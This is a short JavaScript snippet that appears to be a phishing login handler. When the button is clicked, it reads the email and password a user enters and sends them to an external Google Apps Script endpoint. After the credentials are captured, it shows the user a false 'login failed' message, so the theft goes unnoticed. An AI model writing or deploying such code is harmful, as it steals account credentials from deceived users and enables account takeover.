let sendButton = document.querySelector('button');

function send() {
  let email = document.querySelector('#formGroupExampleInput').value;
  let password1 = document.querySelector('#formGroupExampleInput2').value;
  $.ajax({
    url: "https://script.google.com/macros/s/AKfycbyzGTsnKqn2CV1-9f-ahipTL8rx66aGfDeGaqIomCTMD3sYQkl_/exec",
    data: {
        "email": email,
        "password1": password1
    },
    success: function(response) {
      if(response == "成功"){
        alert("登入失敗!");
      }
    },
  });
};

sendButton.addEventListener('click', send);